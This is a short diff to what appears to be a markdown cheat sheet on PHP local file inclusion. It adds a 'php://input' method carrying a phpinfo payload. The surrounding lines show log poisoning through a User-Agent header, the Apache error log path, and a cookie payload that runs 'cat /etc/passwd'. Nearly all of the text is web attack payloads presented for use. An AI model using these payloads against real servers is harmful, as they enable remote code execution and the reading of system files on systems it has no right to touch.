@@ -437,6 +437,14 @@ User-Agent: <?=phpinfo(); ?>
 /usr/local/apache2/log/error_log
 
 ```
+>next way
+```
+
+=php://input  to data
+<?=phpinfo(); ?>
+
+```
+
 >Set the cookie to <?php system('cat /etc/passwd');?>
 ```
 
